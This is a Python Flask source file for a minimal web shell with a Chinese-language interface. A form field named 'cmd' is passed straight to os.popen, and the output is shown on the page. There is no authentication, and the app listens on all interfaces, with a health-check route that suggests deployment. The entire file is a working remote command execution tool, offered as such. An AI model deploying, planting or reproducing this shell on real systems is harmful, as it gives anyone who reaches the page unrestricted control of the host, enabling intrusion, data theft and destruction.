from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Web Shell</title>
    <style>
        body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
        input, button { font-family: monospace; background: #222; color: #0f0; border: 1px solid #0f0; padding: 5px; }
        pre { background: #000; padding: 10px; border: 1px solid #0f0; white-space: pre-wrap; }
    </style>
</head>
<body>
    <h2>簡易 Web Shell</h2>
    <form method="POST">
        <input name="cmd" placeholder="輸入指令" size="40">
        <button type="submit">執行</button>
    </form>
    {% if output %}
    <h3>輸出結果：</h3>
    <pre>{{ output }}</pre>
    {% endif %}
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    output = None
    if request.method == "POST":
        cmd = request.form.get("cmd")
        output = os.popen(cmd).read()
    return render_template_string(TEMPLATE, output=output)

@app.route("/healthz")
def healthz():
    return "OK"
    
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))    
